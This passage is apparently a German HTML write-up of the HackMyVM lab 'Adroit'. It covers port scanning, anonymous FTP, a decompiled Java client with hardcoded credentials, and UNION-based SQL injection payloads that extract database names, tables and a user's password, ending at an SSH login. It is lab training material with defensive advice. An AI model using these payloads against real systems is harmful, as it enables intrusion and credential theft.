@@ -1,0 +1,622 @@
+﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adroit - HackMyVM - Hard - Vulnhub - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg"> <!-- CSS muss background-color: #03b5f5; setzen -->
+        <h1>Adroit - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- CSS muss hier die Farbe auf Rot setzen -->
+            <h2>Hard</h2>
+            <div class="circle">
+                 <!-- CSS muss hier die Farbe auf Rot setzen -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- CSS muss hier die Hintergrundfarbe auf ein passendes Rot setzen -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">jd-gui (Java Decompiler)</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">java</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">grep</div> <span class="comment">(implizit bei SQLi)</span>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der `arp-scan -l` Befehl wird genutzt, um aktive Geräte im lokalen Netzwerksegment durch ARP-Anfragen zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP <span class="command">192.168.2.156</span> und der MAC `08:00:27:db:60:f5` (PCS Systemtechnik GmbH / VirtualBox) wird gefunden. Dies ist das Ziel "Adroit".</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die IP 192.168.2.156. Führen Sie einen detaillierten Portscan auf diese IP durch.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 15 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 900
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+
+ <span class="command">192.168.2.156</span>   08:00:27:db:60:f5      1      60  PCS Systemtechnik GmbH
+_____________________________________________________________________________
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -T5 -sV -A -p-`) wird auf die Ziel-IP 192.168.2.156 durchgeführt, um offene Ports, Dienste, Versionen und Betriebssystemdetails zu ermitteln.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert mehrere offene Ports:
+            <ul><li><span class="command">21/tcp (FTP)</span>: vsftpd 3.0.3. Wichtig: <span class="password">Anonymer Login erlaubt</span> (`Anonymous FTP login allowed`). Ein Verzeichnis `pub` ist sichtbar.</li><li><span class="command">22/tcp (SSH)</span>: OpenSSH 7.9p1 auf Debian 10. Standard-Login-Dienst.</li><li><span class="command">3000/tcp (ppp?)</span>: Unbekannter Dienst, könnte eine benutzerdefinierte Anwendung oder API sein.</li><li><span class="command">3306/tcp (MySQL)</span>: MySQL-Datenbankserver. Status `(unauthorized)` deutet darauf hin, dass keine sofortigen Login-Informationen oder Schwachstellen gefunden wurden.</li><li><span class="command">33060/tcp (mysqlx?)</span>: MySQL X Protocol, oft für neuere Clients oder Admin-Tools verwendet. Nmap ist unsicher und die Fingerprints deuten auf Fehler bei ungültigen Anfragen hin.</li></ul>
+            Der anonyme FTP-Zugang ist der offensichtlichste erste Angriffspunkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Verbinden Sie sich per FTP als anonymer Benutzer mit 192.168.2.156 und untersuchen Sie den Inhalt, insbesondere das `pub`-Verzeichnis.</li><li>Halten Sie Port 3000 im Auge und versuchen Sie, sich damit zu verbinden oder ihn mit Tools wie `nc` oder `curl` zu untersuchen.</li><li>Notieren Sie die offenen MySQL-Ports für spätere Versuche, falls Zugangsdaten gefunden werden.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Deaktivieren Sie anonymen FTP-Zugriff, wenn er nicht zwingend erforderlich ist. Wenn er benötigt wird, stellen Sie sicher, dass nur ungefährliche Dateien freigegeben werden und keine Schreibrechte für anonyme Benutzer bestehen.</li><li>Beschränken Sie den Zugriff auf alle Dienste (SSH, unbekannter Port 3000, MySQL) auf notwendige Netzwerke/IPs.</li><li>Härten Sie die MySQL-Konfiguration und verwenden Sie starke Passwörter.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.156 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 11:42 CEST
+Nmap scan report for hack.hmv (192.168.2.156)
+Host is up (0.00013s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+<span class="command">21/tcp    open  ftp     vsftpd 3.0.3</span>
+| ftp-anon: <span class="password">Anonymous FTP login allowed (FTP code 230)</span>
+|_<span class="command">drwxr-xr-x    2 ftp      ftp          4096 Mar 19  2021 pub</span>
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.153
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+<span class="command">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 d232820f8248cdc233a2a27209c52891 (RSA)
+|   256 4e8a9a49b923c2cdac894f44b20b0bdb (ECDSA)
+|_  256 328882fc8479981db2279626965a686b (ED25519)
+<span class="command">3000/tcp  open  ppp?</span>
+<span class="command">3306/tcp  open  mysql   MySQL (unauthorized)</span>
+<span class="command">33060/tcp open  mysqlx?</span>
+| fingerprint-strings:
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
+|     Invalid message"
+|_    HY000
+[...] <span class="comment">(Unrecognized service fingerprint for 33060)</span>
+MAC Address: 08:00:27:DB:60:F5 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms hack.hmv (192.168.2.156)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.95 seconds</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird eine FTP-Verbindung zum Zielserver hergestellt. Der Benutzer `Anonymous` wird für den Login verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der anonyme Login ist erfolgreich (`230 Login successful.`). Im Hauptverzeichnis befindet sich nur das Verzeichnis `pub`. Im `pub`-Verzeichnis werden drei Dateien gefunden: `<span class="command">adroitclient.jar</span>`, `<span class="command">note.txt</span>` und `<span class="command">structure.PNG</span>`. Alle drei Dateien werden erfolgreich heruntergeladen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie die heruntergeladenen Dateien:
+            <ol><li>Lesen Sie `note.txt`.</li><li>Untersuchen Sie `structure.PNG` auf Hinweise zur Infrastruktur oder Anwendung.</li><li>Dekompilieren Sie `adroitclient.jar` (z.B. mit `jd-gui`), um den Java-Quellcode zu analysieren und nach Zugangsdaten, Verbindungsdetails oder Schwachstellen zu suchen.</li></ol>
+            <strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff oder beschränken Sie ihn streng auf nicht-sensible, notwendige Dateien. Entfernen Sie Anwendungsdateien oder potenziell informative Notizen aus anonym zugänglichen Bereichen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.156</span></div>
+                    <pre>
+Connected to 192.168.2.156.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.156:cyber): <span class="command">Anonymous</span>
+<span class="password">230 Login successful.</span>
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||45358|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 .
+drwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 ..
+<span class="command">drwxr-xr-x    2 ftp      ftp          4096 Mar 19  2021 pub</span>
+226 Directory send OK.
+ftp> <span class="command">cd pub</span>
+250 Directory successfully changed.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||41701|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Mar 19  2021 .
+drwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 ..
+-rw-r--r--    1 ftp      ftp          5451 Jan 14  2021 <span class="command">adroitclient.jar</span>
+-rw-r--r--    1 ftp      ftp           229 Mar 19  2021 <span class="command">note.txt</span>
+-rw-r--r--    1 ftp      ftp         36430 Jan 14  2021 <span class="command">structure.PNG</span>
+226 Directory send OK.
+ftp> <span class="command">get adroitclient.jar</span>
+local: adroitclient.jar remote: adroitclient.jar
+229 Entering Extended Passive Mode (|||47710|)
+150 Opening BINARY mode data connection for adroitclient.jar (5451 bytes).
+100% |*************************************************************************|  5451      306.44 KiB/s    00:00 ETA
+<span class="password">226 Transfer complete.</span>
+5451 bytes received in 00:00 (301.56 KiB/s)
+ftp> <span class="command">get note.txt</span>
+local: note.txt remote: note.txt
+229 Entering Extended Passive Mode (|||48684|)
+150 Opening BINARY mode data connection for note.txt (229 bytes).
+100% |*************************************************************************|   229       18.94 KiB/s    00:00 ETA
+<span class="password">226 Transfer complete.</span>
+229 bytes received in 00:00 (18.61 KiB/s)
+ftp> <span class="command">get structure.PNG</span>
+local: structure.PNG remote: structure.PNG
+229 Entering Extended Passive Mode (|||49924|)
+150 Opening BINARY mode data connection for structure.PNG (36430 bytes).
+100% |*************************************************************************| 36430        3.14 MiB/s    00:00 ETA
+<span class="password">226 Transfer complete.</span>
+36430 bytes received in 00:00 (3.08 MiB/s)
+[...]
+ftp> <span class="command">exit</span>
+221 Goodbye.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `note.txt` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Notiz stammt von einem "Junior-Entwickler", der eine "Java Socket App" erstellt hat, um Ideen zu speichern. Wichtige Hinweise:
+            <ul><li>Der Server startet innerhalb einer Minute neu, wenn etwas "kaputt" geht. Dies ist relevant, falls Exploits zum Absturz führen.</li><li><span class="password">"Also, one 0 is not 0 but O"</span>: Ein kryptischer Hinweis, der wahrscheinlich auf eine Ersetzung im Passwort oder Secret Key hindeutet (0 -> O).</li></ul></p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Behalten Sie den Hinweis "0 -> O" im Gedächtnis, wenn Sie Passwörter oder Schlüssel aus der Java-Anwendung extrahieren. Bereiten Sie sich darauf vor, dass Exploits möglicherweise schnell ausgeführt werden müssen, bevor der Server neu startet. Konzentrieren Sie sich auf die Analyse der `adroitclient.jar`.
+            <br><strong>Empfehlung (Admin):</strong> Hinterlassen Sie keine potenziell nützlichen Hinweise für Angreifer in öffentlich zugänglichen Dateien. Implementieren Sie robustere Neustartmechanismen statt einfacher zeitbasierter Restarts.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat note.txt</span></div>
+                    <pre>
+Hi, i am a junior developer and i am pro with cyber security.
+Also i am a writer and i created a java socket app to save my ideas.
+PS :
+if you break something the server will restart within a minute.
+Also, <span class="password">one 0 is not 0 but O</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auszüge aus dem dekompilierten Code der `adroitclient.jar` (vermutlich mit `jd-gui` analysiert) werden gezeigt. Der Code offenbart einen hartkodierten Secret Key und Zugangsdaten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische Informationen im Quellcode:
+            <ul><li>Secret Key: `<span class="password">Sup3rS3cur3Dr0it</span>` (Beachten Sie die '0' - laut `note.txt` könnte dies eigentlich `<span class="password">Sup3rS3cur3DrOit</span>` sein). Dieser Schlüssel wird für die Verschlüsselung verwendet (`crypt.encrypt`).</li><li>Hostname/Port: Die Anwendung verbindet sich zu `<span class="command">adroit.local</span>` auf Port `<span class="command">3000</span>`.</li><li>Zugangsdaten-Check: Der Code vergleicht die verschlüsselte Benutzereingabe mit dem verschlüsselten Wert von `<span class="command">"zeus"</span>` und `<span class="command">"god.thunder.olympus"</span>`.</li></ul>
+            Dies enthüllt die Zugangsdaten (`zeus`:`god.thunder.olympus`) und den wahrscheinlich zu verwendenden Secret Key (mit O statt 0).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Fügen Sie `adroit.local` zur `/etc/hosts`-Datei hinzu, die auf 192.168.2.156 zeigt.</li><li>Starten Sie `adroitclient.jar` (`java -jar adroitclient.jar`).</li><li>Geben Sie als Benutzername `zeus` und als Passwort `god.thunder.olympus` ein. Beachten Sie den Hinweis `0 -> O` beim Secret Key - dieser ist hier für den Login noch nicht relevant, aber für die Verschlüsselung/Entschlüsselung der Daten, die gesendet/empfangen werden.</li><li>Wenn der Login erfolgreich ist, interagieren Sie mit der Anwendung (Optionen `post`/`get`).</li></ol>
+            <strong>Empfehlung (Admin):</strong> Speichern Sie niemals Zugangsdaten oder Secret Keys hartkodiert im Client-Code. Verwenden Sie sichere Methoden zur Authentifizierung und Schlüsselverwaltung. Offenlegen Sie keine internen Hostnamen (`adroit.local`).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment"># Auszüge aus der Dekompilation von adroitclient.jar (z.B. mit jd-gui)</span>
+
+public class AdroitClient {
+  <span class="password">private static final String secret = "Sup3rS3cur3Dr0it";</span> <span class="comment">// Beachte Hinweis: 0 -> O?</span>
+  static ObjectOutputStream os;
+  static ObjectInputStream is;
+  static Socket socket;
+
+  public static void main(String[] args) throws InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException, BadPaddingException, IllegalBlockSizeException {
+    Crypto crypt = new Crypto();
+    try {
+      <span class="command">socket = new Socket("adroit.local", 3000);</span>
+      os = new ObjectOutputStream(socket.getOutputStream());
+      is = new ObjectInputStream(socket.getInputStream());
+      R request = new R(); <span class="comment">// Vermutlich die Request-Klasse</span>
+      Scanner scanner = new Scanner(System.in);
+      System.out.println("Enter the username : ");
+      String userName = crypt.encrypt("Sup3rS3cur3Dr0it", scanner.nextLine()); <span class="comment">// Verwendet Secret mit 0</span>
+      System.out.println("Enter the password : ");
+      String password = crypt.encrypt("Sup3rS3cur3Dr0it", scanner.nextLine()); <span class="comment">// Verwendet Secret mit 0</span>
+      if (userName.equals(crypt.encrypt("Sup3rS3cur3Dr0it", <span class="command">"zeus"</span>)) &&
+          password.equals(crypt.encrypt("Sup3rS3cur3Dr0it", <span class="command">"god.thunder.olympus"</span>))) {
+        request.setUsername(userName);
+        request.setPassword(password);
+        System.out.println("Options [ post | get ] : ");
+        String option = scanner.next();
+        scanner.nextLine();
+        if (option.toLowerCase().equals("post")) {
+          request.setOption("post");
+          System.out.println("Enter your phrase identifier : ");
+          String id = crypt.encrypt("Sup3rS3cur3Dr0it", scanner.nextLine());
+          System.out.println("Enter your phrase : ");
+          String phrase = crypt.encrypt("Sup3rS3cur3Dr0it", scanner.nextLine());
+          request.setId(id);
+          request.setPhrase(phrase);
+        } <span class="comment">// [...] Rest der Logik für 'get' und Senden/Empfangen</span>
+      } else {
+        System.out.println("Wrong username or password");
+      }
+    } <span class="comment">// [...] try/catch/finally Blöcke</span>
+  }
+}
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die `/etc/hosts`-Datei wird bearbeitet, um `adroit.local` auf die IP des Zielsystems zu mappen. Anschließend wird der Java-Client gestartet. Ein erster Login-Versuch mit `zeus`:`Sup3rS3cur3DrOit` (mit O statt 0, gemäß Hinweis) schlägt fehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der `UnknownHostException`-Fehler vor der `/etc/hosts`-Änderung ist erwartet. Der fehlgeschlagene Login-Versuch nach der Änderung deutet darauf hin, dass entweder der Benutzername/Passwort falsch ist oder der Hinweis `0 -> O` hier nicht zutrifft oder falsch interpretiert wurde. Es ist wahrscheinlicher, dass das Passwort `god.thunder.olympus` ist, wie im Code gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie den Login erneut mit den im Code gefundenen Zugangsdaten: `zeus` und `god.thunder.olympus`.
+            <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie interne Hostnamen oder stellen Sie sicher, dass sie nicht leicht erraten oder aus Anwendungen extrahiert werden können.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre><span class="comment"># Hinzugefügte Zeile: 192.168.2.156 adroit.local</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">java -jar /home/cyber/Downloads/adroitclient.jar</span></div>
+                     <pre>
+<span class="password">java.net.UnknownHostException: adroit.local</span>
+	at java.base/java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:229)
+[...]
+	at adroit.AdroitClient.main(AdroitClient.java:34)</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">java -jar /home/cyber/Downloads/adroitclient.jar</span></div>
+                     <pre>
+Enter the username :
+<span class="command">zeus</span>
+Enter the password :
+<span class="command">Sup3rS3cur3DrOit</span> <span class="comment"># Passwort mit O statt 0 versucht</span>
+<span class="password">Wrong username or password</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Java-Client wird erneut gestartet, diesmal mit den korrekten Zugangsdaten (`zeus`:`god.thunder.olympus`). Der Login ist erfolgreich. Die Option `get` wird gewählt, und als Identifier wird der (vermutlich korrigierte) Secret Key `<span class="password">Sup3rS3cur3DrOit</span>` eingegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Login funktioniert. Die Eingabe des Secret Keys als Identifier führt jedoch wahrscheinlich zu keiner sinnvollen Ausgabe oder einem Fehler auf Serverseite, da hier vermutlich eine ID oder ein Suchbegriff erwartet wird, nicht der Schlüssel selbst. Die Anwendung scheint die Eingabe für den Identifier ebenfalls mit dem Secret zu verschlüsseln, bevor sie gesendet wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Experimentieren Sie mit der `get`-Funktion. Versuchen Sie, einfache IDs (z.B. `1`, `0`, `test`) einzugeben. Da die Anwendung wahrscheinlich SQL auf Serverseite verwendet, testen Sie auf SQL-Injection im "phrase identifier"-Feld.
+             <br><strong>Empfehlung (Admin):</strong> Implementieren Sie serverseitige Validierung und Eingabebereinigung für alle vom Client empfangenen Daten. Vermeiden Sie es, Secret Keys als Identifier zu verwenden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">java -jar /home/cyber/Downloads/adroitclient.jar</span></div>
+                     <pre>
+Enter the username :
+<span class="command">zeus</span>
+Enter the password :
+<span class="command">god.thunder.olympus</span>
+Options [ post | get ] :
+<span class="command">get</span>
+Enter the phrase identifier :
+<span class="command">Sup3rS3cur3DrOit</span> <span class="comment"># Secret Key als ID versucht</span>
+<span class="comment">[Keine sinnvolle Ausgabe oder Fehler erwartet]</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird eine SQL-Injection im Feld "phrase identifier" versucht. Der Payload `<span class="command">1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--</span>` wird eingegeben. Das `NULL` wird verwendet, da die ursprüngliche Abfrage wahrscheinlich zwei Spalten zurückgibt. `concat()` wandelt den Schemanamen in einen String um. `--` kommentiert den Rest der ursprünglichen SQL-Abfrage aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">SQL-Injection erfolgreich!</span> Die Anwendung ist anfällig. Die Ausgabe zeigt die Namen der Datenbanken auf dem Server: `mysql`, `information_schema`, `performance_schema`, `sys` (Standard-MySQL-Datenbanken) und `<span class="command">adroit</span>` (die Anwendungsdatenbank).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die SQLi weiter, um Tabellen (`information_schema.TABLES`), Spalten (`information_schema.COLUMNS`) und schließlich Daten (insbesondere aus der `adroit`-Datenbank) zu extrahieren. Konzentrieren Sie sich auf Benutzertabellen (`users`).
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die SQL-Injection-Schwachstelle dringend, indem Sie Prepared Statements oder eine ordnungsgemäße Escaping-Funktion für alle Benutzereingaben verwenden, die in Datenbankabfragen einfließen. Beschränken Sie die Berechtigungen des Datenbankbenutzers, den die Java-Anwendung verwendet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">java -jar /home/cyber/Downloads/adroitclient.jar</span></div>
+                     <pre>
+Enter the username :
+zeus
+Enter the password :
+god.thunder.olympus
+Options [ post | get ] :
+get
+Enter the phrase identifier :
+<span class="command">1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--</span>
+<span class="password"> mysql information_schema performance_schema sys adroit</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die SQL-Injection wird genutzt, um die Tabellennamen aus der Datenbank `adroit` zu extrahieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zwei Tabellen werden gefunden: `<span class="command">ideas</span>` und `<span class="command">users</span>`. Die `users`-Tabelle ist das primäre Ziel.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahieren Sie als Nächstes die Spaltennamen der `users`-Tabelle.
+             <br><strong>Empfehlung (Admin):</strong> (Siehe vorherige SQLi-Empfehlung).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">java -jar /home/cyber/Downloads/adroitclient.jar</span></div>
+                     <pre>
+Enter the username :
+zeus
+Enter the password :
+god.thunder.olympus
+Options [ post | get ] :
+get
+Enter the phrase identifier :
+<span class="command">1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='adroit'--</span>
+<span class="password"> ideas users</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die SQL-Injection wird genutzt, um die Spaltennamen der Tabelle `users` zu extrahieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die relevanten Spalten sind `<span class="command">id</span>`, `<span class="command">password</span>` und `<span class="command">username</span>`. Weitere Spalten (`CURRENT_CONNECTIONS` etc.) scheinen MySQL-Statusinformationen zu sein, die möglicherweise durch ein `JOIN` oder eine fehlerhafte Abfrage hereinkommen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahieren Sie nun die Daten (insbesondere `username` und `password`) aus der `users`-Tabelle.
+             <br><strong>Empfehlung (Admin):</strong> (Siehe vorherige SQLi-Empfehlung).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">java -jar /home/cyber/Downloads/adroitclient.jar</span></div>
+                     <pre>
+Enter the username :
+zeus
+Enter the password :
+god.thunder.olympus
+Options [ post | get ] :
+get
+Enter the phrase identifier :
+<span class="command">1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--</span>
+<span class="password"> id password username CURRENT_CONNECTIONS TOTAL_CONNECTIONS USER</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die SQL-Injection wird genutzt, um die `id`, `username` und `password`-Spalten aus der `users`-Tabelle zu extrahieren. `0x20` ist der Hex-Code für ein Leerzeichen, `0x0a` für einen Zeilenumbruch.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein Benutzer wird gefunden:
+             <ul><li>ID: `1000`</li><li>Username: `<span class="command">writer</span>`</li><li>Password (Hash?): `<span class="password">l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=</span>`</li></ul>
+             Der Passwort-String sieht nach einem Base64-kodierten Hash aus. Der Text fügt hier einen Kommentar ein: `<span class="password">just.write.my.ideas</span>`. Dies ist vermutlich das Klartext-Passwort, das entweder durch Offline-Knacken des Hashes oder durch einen anderen Hinweis (der im Text fehlt) ermittelt wurde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Benutzernamen `writer` und das (vermutlich ermittelte) Passwort `just.write.my.ideas`, um sich per SSH anzumelden.
+             <br><strong>Empfehlung (Admin):</strong> Speichern Sie Passwörter niemals als Klartext oder einfach kodierte Hashes. Verwenden Sie starke Hashing-Algorithmen mit Salt (z.B. Argon2, bcrypt).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">java -jar /home/cyber/Downloads/adroitclient.jar</span></div>
+                     <pre>
+Enter the username :
+zeus
+Enter the password :
+god.thunder.olympus
+Options [ post | get ] :
+get
+Enter the phrase identifier :
+<span class="command">1 UNION ALL SELECT NULL,concat(id,0x20,username,0x20,password,0x0a) FROM users--</span>
+<span class="password"> 1000 writer l4A+n+p+xSxDcYCl0mgxKr015+OEC3aOfdrWafSqwpY=</span>
+<span class="comment">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+<span class="password">just.write.my.ideas</span> <span class="comment"># Vermutetes Klartext-Passwort</span>
+<span class="comment">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span></pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH als Benutzer `writer` mit dem Passwort `just.write.my.ideas` anzumelden.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Login erfolgreich!</span> Der Angreifer erhält eine Shell als Benutzer `writer` auf dem Zielsystem `adroit`. Der initiale Zugriff wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach der User-Flag (oft `user.txt` oder `local.txt` im Home-Verzeichnis). Führen Sie Enumeration als `writer` durch (`sudo -l`, SUID-Binaries etc.), um Wege zur Rechteausweitung zu finden.
+             <br><strong>Empfehlung (Admin):</strong> Starke Passwörter erzwingen, SSH-Zugriff überwachen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh writer@adroit.hmv</span></div>
+                     <pre>
+The authenticity of host 'adroit.hmv (192.168.2.156)' can't be established.
+ED25519 key fingerprint is SHA256:MjriZUEzDG3XMTvA2EyIORDspzrtXeVdMNBaKghYb2s.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'adroit.hmv' (ED25519) to the list of known hosts.
+<span class="comment">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+writer@adroit.hmv's password: <span class="command">just.write.my.ideas</span>
+<span class="comment">::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+Linux adroit 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
